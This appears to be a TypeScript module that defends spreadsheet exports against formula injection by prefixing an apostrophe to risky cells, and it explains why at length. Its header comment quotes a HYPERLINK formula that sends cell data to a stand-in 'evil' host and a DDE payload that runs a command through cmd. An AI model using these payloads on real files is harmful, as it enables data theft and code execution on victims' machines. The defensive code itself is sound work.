/**
 * Spreadsheet formula injection (CLAUDE.md §5.11).
 *
 * A spreadsheet decides whether a cell is data or code by looking at its first
 * character. So a contact whose surname is `=HYPERLINK("http://evil/"&A1,"x")`
 * is stored as a harmless string, exported as a harmless string — and then
 * **executed** the moment somebody opens the file in Excel, Sheets or
 * LibreOffice. The attacker never touches our servers; the victim is whoever
 * the export is emailed to. It is the one injection where escaping at the
 * boundary is the entire defence, because the interpreter is not ours.
 *
 * The fix is one character: a leading apostrophe forces the cell to text.
 *
 * ## What counts as dangerous
 *
 * CLAUDE.md names `=`, `+`, `-`, `@`, tab and carriage return. Two notes:
 *
 *   - `-` and `+` are there because `-1+1` is arithmetic, and because
 *     `-2+3+cmd|' /c calc'!A0` is the classic DDE payload.
 *   - tab and carriage return are there because Excel strips leading
 *     whitespace before deciding, so `\t=1+1` is a formula.
 *
 * That reason is not specific to tab and carriage return. If whitespace is
 * stripped before the decision, then `" =1+1"`, a non-breaking space, an em
 * space and a zero-width space in front of `=` are the same formula, and a list
 * of whitespace characters is a list with a member somebody forgot. So the rule
 * is two-part and closes the class rather than its three listed members:
 *
 *   1. a cell whose **first character** is on the policy list is escaped,
 *      whatever follows (CLAUDE.md §5.11 verbatim, plus `\n`); and
 *   2. a cell whose **first non-whitespace character** is `=`, `+`, `-` or `@`
 *      is escaped, where "whitespace" is every Unicode space (`\s`: NBSP, the
 *      en/em/thin spaces, ideographic space, line and paragraph separators) and
 *      the invisible characters that are not spaces but are not seen either
 *      (zero-width space, joiner, non-joiner, word joiner, BOM).
 *
 * The apostrophe still goes at position 0, so the escape itself is unchanged.
 * Over-escaping costs an apostrophe on a value that began with a dash after
 * some spaces; under-escaping costs code execution on somebody's machine.
 *
 * ## Where it is applied
 *
 * In the writer, on **every** cell of every format, not on the columns that
 * look risky. The value that reaches an export may have come from a system
 * column, a custom field created five minutes ago, or a CSV a user imported
 * last week — and the import path is precisely how an attacker gets a string
 * of their choosing into a tenant's data in the first place. A list of
 * "fields to escape" is a list that will be out of date the next time
 * somebody adds a field, which is why there isn't one.
 */

/** The characters a spreadsheet treats as "this cell is code". */
export const FORMULA_TRIGGER_CHARACTERS: readonly string[] = ['=', '+', '-', '@', '\t', '\r', '\n'];

const TRIGGERS: ReadonlySet<string> = new Set(FORMULA_TRIGGER_CHARACTERS);

/** What starts a formula once leading whitespace has been stripped. */
const CODE_STARTERS: ReadonlySet<string> = new Set(['=', '+', '-', '@']);

/** Whitespace, plus the invisible characters a spreadsheet may skip as well. */
const LEADING_IGNORABLE = /^[\s\u200B-\u200D\u2060\uFEFF]*/u;

/** The prefix that forces a cell to be read as text. */
export const FORMULA_ESCAPE_PREFIX = "'";

export function startsFormula(value: string): boolean {
  const first = value.charAt(0);
  if (first === '') return false;
  if (TRIGGERS.has(first)) return true;

  const skipped = LEADING_IGNORABLE.exec(value)?.[0].length ?? 0;
  const next = value.charAt(skipped);
  return next !== '' && CODE_STARTERS.has(next);
}

/**
 * Make one cell safe to open.
 *
 * Idempotent in the sense that matters: an already-escaped value starts with
 * `'`, which is not a trigger, so re-escaping leaves it alone. A plain E.164 phone number is left as
 * it is (see `isPlainPhoneNumber`).
 */
export function escapeSpreadsheetCell(value: string): string {
  return startsFormula(value) && !isPlainPhoneNumber(value) ? FORMULA_ESCAPE_PREFIX + value : value;
}

/**
 * A value that is exactly an E.164 phone number: `+`, a non-zero digit, then 1 to 14 digits (the
 * pattern every phone field is validated against). Written out in `[0-9]`, not `\d`, so no other
 * script's digits can pass, and anchored at both ends with no `m` flag, so a trailing line break
 * does not pass either.
 *
 * Every phone number begins with `+`, so escaping by first character alone put an apostrophe in
 * front of every phone cell of every export (pilot finding F5). This is the one exception, and it
 * is safe because of what is *not* in the value: after the plus there are only digits, so a
 * spreadsheet can read it as nothing but a number. A formula needs a function name, a cell
 * reference, an operator or a separator, and a DDE command needs `|` and `!`; none of them can
 * occur here. A value with anything extra, even a space or a second `+`, is not matched and is
 * escaped like any other cell that starts with `+`.
 *
 * A spreadsheet may still show a CSV phone number as a plain number, without the plus; use the
 * `.xlsx` export, which stores it as text, to see it exactly as written.
 */
const PLAIN_E164 = /^\+[1-9][0-9]{1,14}$/;

export function isPlainPhoneNumber(value: string): boolean {
  return PLAIN_E164.test(value);
}

/**
 * The cell writer both formats share.
 *
 * `null` and `undefined` become an empty cell rather than the strings "null"
 * or "undefined". Everything else is stringified and escaped — numbers,
 * booleans and dates included, so that a future value type cannot slip past by
 * not being a string yet.
 */
export function toExportCell(value: unknown): string {
  if (value === null || value === undefined) return '';
  if (value instanceof Date) return value.toISOString();
  return escapeSpreadsheetCell(plainText(value));
}

/**
 * A value as the text a cell holds, with no decision about escaping.
 *
 * Explicit about each primitive, because `String(value)` on an `unknown` is how
 * an object ends up as the cell `[object Object]` — or, worse, how a type that
 * is added later is quietly stringified one way in one writer and another way in
 * the next.
 */
export function plainText(value: unknown): string {
  if (typeof value === 'string') return value;
  if (typeof value === 'number' || typeof value === 'boolean' || typeof value === 'bigint') {
    return String(value);
  }
  return JSON.stringify(value) ?? '';
}

/**
 * The inverse, for a file we exported coming back in.
 *
 * Our own escape is a leading apostrophe in front of a trigger character, so
 * an export round-trips: `'-1500.00 INR` becomes `-1500.00 INR` again instead
 * of failing to parse. Only that exact shape is undone — an apostrophe in front
 * of anything else (`'Neil`) is part of the data and is left alone — and the
 * result is a plain stored string that the *next* export escapes again, so
 * undoing it opens nothing.
 */
export function unescapeSpreadsheetCell(value: string): string {
  if (value.startsWith(FORMULA_ESCAPE_PREFIX) && startsFormula(value.slice(1))) {
    return value.slice(1);
  }
  return value;
}
